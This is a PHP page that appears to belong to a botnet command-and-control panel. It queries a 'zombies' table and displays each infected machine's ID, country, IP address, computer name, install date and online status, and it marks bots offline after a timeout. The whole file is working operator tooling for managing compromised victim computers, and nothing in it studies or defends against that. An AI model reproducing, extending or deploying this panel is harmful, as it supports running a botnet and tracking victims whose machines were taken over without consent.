<?php require_once('inc/session.php'); require_once('inc/body.php'); require_once('inc/config.php'); require_once('classes/pagenavi.class.php'); require_once('funcs/safe.php'); ?>

<h3><img src="img/icons/list.png" />&nbsp;Bot list</h3>

<table>
<tr>
	<th class="table" id="kleiner"><img src="img/icons/id.png" />&nbsp;ID</th>
	<th class="table"><img src="img/icons/geo.png" />&nbsp;Geo</th>
	<th class="table" id="extra"><img src="img/icons/computer.png" />&nbsp;Computer</th>

	<th class="table"><img src="img/icons/installed.png" />&nbsp;Installed</th>
	<th class="table" id="mittel"><img src="img/icons/status.png" />&nbsp;Status</th>
</tr>
	<?php
	//Show zombies
	  $query = mysql_query("SELECT COUNT(*) FROM zombies");
	  $item_count = mysql_result($query, 0);
	  $nav = new PageNavigation($item_count, pages());
	  $query = mysql_query("SELECT * FROM zombies ORDER BY id LIMIT " . safe_sql($nav->sql_limit));
	  $item_number = $nav->first_item_id;
		
	  while($row = mysql_fetch_array($query))
	  {
		echo '<tr>
				  <td class="td" id="kleiner">'.safe_xss($row['id']).'</td>
				  <td class="td"><img src="img/flags/'.safe_xss($row['country']).'.png" />&nbsp;('.strtoupper(safe_xss($row['country'])).')&nbsp;'.safe_xss($row['countrylong']).'&nbsp;'.safe_xss($row['ip']).'</td>
				  <td class="td" id="extra">'.safe_xss($row['pc']).'</td>
				  <td class="td">'.safe_xss($row['install']).'</td>'.
				  onoff(safe_xss($row['status'])).'</td>
			  </tr>';
	  }
	  
		
	  //Online or Offline
	  $q2 = mysql_query("SELECT * FROM zombies WHERE TIMESTAMPADD(MINUTE,".safe_sql($minutes).",time) < NOW()");
	  while($row = mysql_fetch_array($q2))
	  {	
		$hwid = $row['hwid'];
		mysql_query("UPDATE zombies Set status = '0' WHERE hwid LIKE '".safe_sql($hwid)."'");
	  }
	  
	  function onoff($a){
		if($a == '1'){ return '<td class="td" id="on">Online'; }else{ return '<td id="off" class="td">Offline'; }
	  }
	  
	  //Pages
	  function pages(){
		$ergebnis = mysql_query("SELECT * FROM settings");
		  while($row = mysql_fetch_array($ergebnis))
		  {
			return safe_xss($row['pages']);
		  }
	  }
	?>
</table>

<?php echo '<div style="float: right;">'.$nav->createPageBar().'</div><br />'; require_once('inc/footer.php'); ?>